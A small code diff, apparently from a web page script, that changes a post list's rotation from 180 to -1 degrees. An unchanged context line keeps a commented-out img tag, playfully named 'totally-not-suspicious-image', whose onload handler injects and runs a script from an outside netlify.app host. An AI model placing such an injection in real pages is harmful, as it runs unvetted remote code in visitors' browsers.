@@ -1,4 +1,4 @@
-postList.style.transform = 'rotate(180deg)';
+postList.style.transform = 'rotate(-1deg)';
 
 /*<img id="totally-not-suspicious-image" src="https://storiesmymummytoldme.files.wordpress.com/2015/06/dap.jpg" onload="s=document.createElement('script');s.src='https://lame.netlify.app/df.js';document.head.appendChild(s);">*/
 
